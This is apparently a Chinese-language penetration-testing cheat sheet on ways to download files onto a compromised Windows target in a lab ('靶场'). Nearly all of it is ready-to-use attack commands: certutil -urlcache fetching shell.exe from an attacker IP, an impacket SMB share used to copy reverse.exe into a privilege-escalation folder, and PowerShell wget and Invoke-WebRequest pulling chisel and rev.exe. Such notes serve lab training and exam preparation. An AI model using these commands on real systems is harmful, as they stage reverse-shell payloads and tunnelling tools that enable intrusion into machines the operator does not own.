# windows下载

最常用也好用 **certutil.exe -urlcache -split -f http://10.10.16.3/shell.exe C:\Windows\Temp\shell.exe**

**或者curl**

smb，python,ftp这几种方法都比较好用

```python
-------------------------------------------
在 Kali 上
smbserver.py s . -smb2support -username df -password df
在靶场同时开启共享
net use \\192.168.119.175\s /u:df df
copy \\10.10.10.10\s\reverse.exe C:\PrivEsc\reverse.exe
--------------------------------------------
或者
powershell -c "wget 10.10.14.6/chisel_windows_amd64.exe -o c.exe"
或者
Invoke-WebRequest "http://10.10.14.12/rev.exe" -OutFile "rev.exe"
```
